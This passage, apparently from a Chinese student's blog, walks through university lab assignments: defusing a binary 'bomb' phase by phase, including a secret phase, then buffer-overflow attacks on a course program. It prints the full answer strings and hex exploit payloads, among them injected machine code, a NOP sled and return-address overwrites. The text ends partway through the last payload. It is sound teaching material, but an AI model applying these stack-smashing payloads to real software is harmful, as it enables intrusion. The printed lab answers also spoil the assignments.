src="/2021/computer-architecture-hitlabs/image-20210421175354138.png"></p><p>进入read_six_number:</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422143204775.png"></p><p>可知read_six_number用来处理输入，输入格式为”%d %d %d %d %d %d”。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422134321868.png"></p><p>根据汇编代码可推断出输入数字的规律。</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h2><p>1 2 4 7 11 16</p><p>b 89</p><p>进入phase_3:</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422144049874.png"></p><p>可知输入形式为”%d %c %d”。</p><p>测试输入<code>1 c 0</code></p><p><img src="/2021/computer-architecture-hitlabs/image-20210422145054755.png"></p><p>可知 <code>0xc(%rsp)</code> 处存的是第一个输入数字。<code>cmp $0x7, %eax</code> 表明该数字不能大于7。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422145421416.png"></p><p>接下来看位于<code>0x8(%rsp)</code>的第二个数字是否等于0x368 = 872。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422150618945.png"></p><p>由第三步比较可得需要输入的字符为’t’。</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase 4"></a>phase 4</h2><p>1 t 872</p><p>b 95</p><p>进入phase_4:</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422150922762.png"></p><p>同理得，需要输入的是两个数字。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422151719517.png"></p><p>继续往下，可知第二q个数字需要在[2, 4]中。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422202835800.png"></p><p>看 func4 函数返回时的汇编代码得输入的第一个数字需要与eax相等。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422204740646.png"></p><p>从func4退出时，rax的值为0xa2。(在第二个输入数字为3的情况下)</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422152712885.png"></p><p><img src="/2021/computer-architecture-hitlabs/image-20210422153036291.png"></p><p>esi 中存放输入的第二个数字，edi的初始值为8。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422153344590.png"></p><p>将edi与1比较，若相等则跳到<code>mov %esi, %eax</code>。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422153609671.png"></p><p>func4函数内部会将参数减一，调用自己。进入第二个func4函数栈时，edi == 7。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422153909104.png"></p><p>一直到参数为1。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422154208393.png"></p><p>由此可以写出func4的框架：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> n)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> 输入的第二个数字</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> res1 = func(n<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">int</span> res2 = func(n<span class="number">-2</span>);</span><br><span class="line">        <span class="keyword">return</span> res1 + res2 + 输入的第二个数字</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将输入的第二个数字记为②，得到func4最终的返回值为：</p><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th></tr></thead><tbody><tr><td>②</td><td>2②</td><td>4②</td><td>7②</td><td>12②</td><td>20②</td><td>33②</td><td>54②</td></tr></tbody></table><p>只要满足输入数字：① = 54 ②。</p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase 5"></a>phase 5</h2><p>162 3</p><p>b 101</p><p>同理查看scanf参数得到需要的为两个数字(“%d %d”)。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422214403157.png"></p><p>当eax二进制后4位为1111时，跳入phase_5+91。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422214132046.png"></p><p>edx 的最后4位需要为0xf，输入的第二个数字需要与ecx相等。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422215036187.png"></p><p>输入的第一个数字后四位不为1111时，执行phase_4之后代码，可得rax是访问数组的下标。</p><p><code>mov %eax, 0xc(%rsp)</code>: 用array[①] 的值覆盖①的位置。</p><p><code>add %eax, %ecx</code>: 将该数组值加入ecx。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422220110768.png"></p><p>由此可得，最终的结果是从下标为①开始执行上述主要操作15次后，rax的值为15，经过的累加和(ecx)则为②。</p><p>根据array的值，可得5 115。</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase 6"></a>phase 6</h2><p>5 115</p><p>b 108</p><p>进入phase_6，由read_six_number函数可知需要输入的是六个数字。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423074937411.png"></p><p>查看rsp处内容可知：函数将输入的六个数字(1 2 3 4 5 6)放在了rsp+0x30处。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423075339517.png"></p><p>对应汇编代码中的位置表明rax用来选定某一个数字。</p><p>分析phase_6的汇编代码，可得：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423081019406.png"></p><p>由此可以推断出函数的第一部分为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(input[i] - <span class="number">1</span> &gt; <span class="number">5</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; <span class="number">6</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(input[i] == input[j]) <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终结果其中一个要求输入为两两不相等的六个小于7的数字（即123456的一个排列）。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423085247725.png"></p><p><img src="/2021/computer-architecture-hitlabs/image-20210423090018665.png"></p><p>分析可得，函数遍历输入的每一个数字，每次eax都从1到6递增，当遍历到的第i个数等于eax，则把对应的ebp的值（nodei地址）存入栈rsp+8(i-1)中，ebp随eax变化而变化，变为下一个节点（next）地址。</p><p>例如，假设输入为3 1 2 5 6 4，则栈顶node地址排列也是3 1 2 5 6 4。</p><p>接下来，将node序列按照这个顺序重新连接（改变每一个node的next域为序列中的下一个）。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423141118889.png"></p><p><img src="/2021/computer-architecture-hitlabs/image-20210423141414546.png"></p><p>最终接受的结果为：所有相邻的节点，前一个节点（rbx）的value比当前节点的value（eax）值小（即排序）。</p><p>各节点value分别为：738、323、138、191、148、584。</p><p>则从小到大排序index为3-&gt;5-&gt;4-&gt;2-&gt;6-&gt;1。</p><p>因此输入的数字应该为 3 5 4 2 6 1。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423143414354.png"></p><h2 id="隐藏关卡"><a href="#隐藏关卡" class="headerlink" title="隐藏关卡"></a>隐藏关卡</h2><p>在 phase_defused 函数中：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422211257809.png"></p><p>当在第四关输入后附加特定字符串时，进入隐藏关卡。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423145041470.png"></p><p>由此可知特定字符串是DrEvil。</p><p>但需要当0x40576c处的值(num_input_string)等于6时才会进入(即解开前面全部六关后)。</p><p>secret_phase汇编代码：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422211430054.png"></p><p>由atoi函数可知需要输入的是一个整数。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423151243541.png"></p><p>这个整数减去一后需要不比0x3e8(1000)大。</p><p>接着会进入一个fun7函数，得到的返回值应该为6。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423151600870.png"></p><p>进入fun7：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423163239565.png"></p><p>当输入的数字比rdi指向的数字大时，rdi加上0x10递归，返回时将得到的值乘以2加一；小时，rdi加上0x8递归，返回时将得到的值乘以；若相等则返回0。</p><p>需要最终返回值为6则可以经过0-&gt;1-&gt;3-&gt;6。其中大小变化为 小于-&gt;大于-&gt;大于-&gt;相等。一步步输入值测试得到最终的”相等”为0x23(35)。</p><p>全部完成：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423162943384.png"></p><h2 id="收获-2"><a href="#收获-2" class="headerlink" title="收获"></a>收获</h2><ol><li>练习了如何使用gdb来调试程序。</li><li>学习了edb的使用方法。</li><li>更深地理解的不同结构的c代码生成的汇编代码。</li><li>学会了如何通过查看内存和寄存器变化来反推程序代码。</li><li>通过实践真正理解了各种数据的存储位置和访问方式。</li></ol><h1 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h1><p>32位 with ebp</p><h2 id="smoke"><a href="#smoke" class="headerlink" title="smoke"></a>smoke</h2><p>生成cookie：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210428161046341.png"></p><p><img src="/2021/computer-architecture-hitlabs/image-20210428161418480.png"></p><p>smoke 地址：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210428165538996.png"></p><p>攻击字符串的大小应该是0x28+4+4=48个字节。攻击字符串的最后4字节应是smoke函数的地址0x08048bbb。(小端模式写入)</p><p>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 bb 8b 04 08</p><p>成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210428173923240.png"></p><h2 id="Fizz"><a href="#Fizz" class="headerlink" title="Fizz"></a>Fizz</h2><p>fizz的地址为0x08048be8，参数应该存在 %ebp + 8 的位置。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210428180037175.png"></p><p>从getbuf弹出返回值后，esp指向(返回地址-4)的位置。</p><p>第五行汇编代码不是将0x804e158放入edx，而是将在0x804e158这个地址的数放入。若代表立即数，会在数前面加上$。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210428225717486.png"></p><p>成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210428224608219.png"></p><h2 id="Bang"><a href="#Bang" class="headerlink" title="Bang"></a>Bang</h2><p>查看bang函数内部：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210429151703502.png"></p><p>可知全局变量存在 0x0804e160 的位置，要等于cookie值。</p><p>写出设置全局变量的汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov 0x804e158, %eax</span><br><span class="line">mov %eax, 0x804e160</span><br><span class="line">pushl $0x08048c39</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>通过下面两条命令来生成汇编代码的机器代码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -c asm.s</span><br><span class="line">objdump -d asm.o</span><br></pre></td></tr></table></figure><p>构造一个包含十二个四字节串的字符串，前面为生成的机器指令（生成顺序），最后四个字节为buf数组的地址（小端顺序）。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a1 <span class="number">58</span> e1 <span class="number">04</span> <span class="number">08</span></span><br><span class="line">a3 <span class="number">60</span> e1 <span class="number">04</span> <span class="number">08</span></span><br><span class="line"><span class="number">68</span> <span class="number">39</span> <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span></span><br><span class="line">c3</span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line">e8 <span class="number">2f</span> <span class="number">68</span> <span class="number">55</span>   # 返回地址，即插入的机器代码的地址</span><br></pre></td></tr></table></figure><p>成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210429201658050.png"></p><blockquote><p><img src="/2021/computer-architecture-hitlabs/image-20210429154914764.png"></p><p>assembly language source files in Unix are traditionally named <code>.s</code>, or <code>.S</code> (capital S, remember Unix filenames are case sensitive) if they are to be passed through the C preprocessor. (C-style macro and include expansion are handled by the C preprocessor, not by the assembler itself, which is why it doesn’t work when you run <code>as</code> directly.)</p><p>Files not otherwise recognized are assumed to be object files to be passed to the linker, but since you specified <code>-c</code>, the linker is not to be run, so <code>gcc</code> thinks there is nothing to do.</p><p>正确：加上后缀.S</p><p><img src="/2021/computer-architecture-hitlabs/image-20210429155136028.png"></p></blockquote><p>注意：若使用call的汇编指令，bufbomb会产生 segmentation fault。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210429202957431.png"></p><h2 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h2><p>与第三阶段同理，返回时回到test原本保存的返回地址，需要注意的是需要把test的ebp还原。汇编代码如下：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210429205135658.png"></p><p>构造的字符串为</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b8 <span class="number">48</span> <span class="number">3</span>e e9 <span class="number">25</span></span><br><span class="line">bd <span class="number">30</span> <span class="number">30</span> <span class="number">68</span> <span class="number">55</span></span><br><span class="line"><span class="number">68</span> a7 <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span></span><br><span class="line">c3</span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">e8 <span class="number">2f</span> <span class="number">68</span> <span class="number">55</span></span><br></pre></td></tr></table></figure><blockquote><p>问题：汇编代码使用内存地址赋值时失败。</p><p>原因：生成的机器代码将call变为e8，代表跳至相对地址处，rip不同则不同。</p><p>避开使用call还可以这么实现：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movl $0x804204e, %eax</span><br><span class="line">jmp *%eax</span><br></pre></td></tr></table></figure></blockquote><h2 id="Nitro"><a href="#Nitro" class="headerlink" title="Nitro"></a>Nitro</h2><p>在getbufn函数打断点，每次执行查看ebp的值，发现是差为0x18的等差数列。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210430213035638.png"></p><p>同时记下testn的返回地址，在汇编代码中最后跳转，恢复原来的位置。</p><p>验证：在testn的汇编代码中有</p><p><img src="/2021/computer-architecture-hitlabs/image-20210505093440581.png"></p><p>由于testn和getbufn的栈是连续的，从getbufn返回后，二者没有变化，esp和ebp的差值确实为0x18。</p><p>完整汇编代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x25e93e48, %eax</span><br><span class="line">movl 0x18(%esp), %ebp</span><br><span class="line">pushl $0x08048d21</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>同时在<code>push %eax</code>语句处打断点，%eax中存着输入字符串的存储起始位置：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210505084134543.png"></p><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody><tr><td>55 68 2e 08</td><td>55 68 2e 48</td><td>55 68 2d 98</td><td>55 68 2d c8</td><td>55 68 2e 18</td></tr></tbody></table><p><img src="/2021/computer-architecture-hitlabs/image-20210505095124477.png" alt="image-20210505095124477"></p><p>字符串长度为0x208+4+4=524个子节，前面用90(nop指令)填充，接着为攻击代码，覆盖ebp，最后是跳转地址，从每次的输入字符串起始位置中选出最大的作为跳转地址。</p><p>由此得到字符串：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line">b8 <span class="number">48</span> <span class="number">3</span>e e9 <span class="number">25</span> <span class="number">8</span>b <span class="number">6</span>c <span class="number">24</span> <span class="number">18</span> <span class="number">68</span> <span class="number">21</span> <span class="number">8</span>d <span class="number">04</span> <span class="number">08</span> c3   # 恶意代码</span><br><span class="line"><span class="number">48</span> <span class="number">2</span>e <span class="number">68</span> <span class="number">55</span>   # 